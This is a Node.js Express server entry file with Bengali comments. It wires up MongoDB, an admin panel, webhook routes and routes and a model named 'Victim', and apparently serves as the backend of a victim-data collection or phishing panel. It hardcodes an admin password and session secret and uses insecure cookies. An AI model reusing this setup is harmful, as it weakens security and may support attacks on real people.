const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const fs = require('fs-extra');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ============================
// ১. লোকাল কনফিগ ফাইল
// ============================
const DATA_DIR = path.join(__dirname, 'data');
const CONFIG_FILE = path.join(DATA_DIR, 'config.json');
fs.ensureDirSync(DATA_DIR);

if (!fs.existsSync(CONFIG_FILE)) {
    fs.writeJsonSync(CONFIG_FILE, { mongoUri: '', adminPassword: 'Sakib@7890' });
}

let localConfig = fs.readJsonSync(CONFIG_FILE);

// ============================
// ২. MongoDB সংযোগ
// ============================
let isDbConnected = false;

async function connectDB(uri) {
    if (!uri) {
        console.log('⚠️ MongoDB URI নেই। অ্যাডমিন প্যানেলে গিয়ে URI সেট করুন।');
        return;
    }
    try {
        await mongoose.connect(uri, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            serverSelectionTimeoutMS: 5000
        });
        isDbConnected = true;
        console.log('✅ MongoDB সংযুক্ত');
        require('./models/Config');
        require('./models/User');
        require('./models/Victim');
    } catch (err) {
        console.error('❌ MongoDB সংযোগ ব্যর্থ:', err.message);
        isDbConnected = false;
    }
}

connectDB(localConfig.mongoUri);

// ============================
// ৩. মিডলওয়্যার
// ============================
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));
app.use(express.static('public'));   // <--- স্ট্যাটিক ফাইল সার্ভ করা (ইমেজ সহ)
app.use(session({
    secret: 'sakib_super_secret_key_7890',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// ============================
// ৪. লোকাল কনফিগ আপডেট API
// ============================
app.post('/admin/update-local-config', (req, res) => {
    if (!req.session.isAdmin) return res.status(403).send('Unauthorized');
    const { mongoUri, adminPassword } = req.body;
    const config = fs.readJsonSync(CONFIG_FILE);
    if (mongoUri) config.mongoUri = mongoUri;
    if (adminPassword) config.adminPassword = adminPassword;
    fs.writeJsonSync(CONFIG_FILE, config);
    localConfig = config;
    if (mongoUri) {
        connectDB(mongoUri);
    }
    res.redirect('/admin/dashboard?msg=কনফিগ+সেভ+হয়েছে');
});

// ============================
// ৫. রাউটস লোড
// ============================
const webhookRoutes = require('./routes/webhook');
const adminRoutes = require('./routes/admin');
const victimRoutes = require('./routes/victim');

app.use(webhookRoutes);
app.use(adminRoutes);
app.use(victimRoutes);

// ============================
// ৬. সার্ভার চালু
// ============================
app.listen(PORT, () => {
    console.log(`🚀 সার্ভার: http://localhost:${PORT}`);
    console.log(`🔐 অ্যাডমিন: http://localhost:${PORT}/admin`);
    console.log(`📌 MongoURI: ${localConfig.mongoUri ? '✅ সেট' : '❌ সেট নেই'}`);
});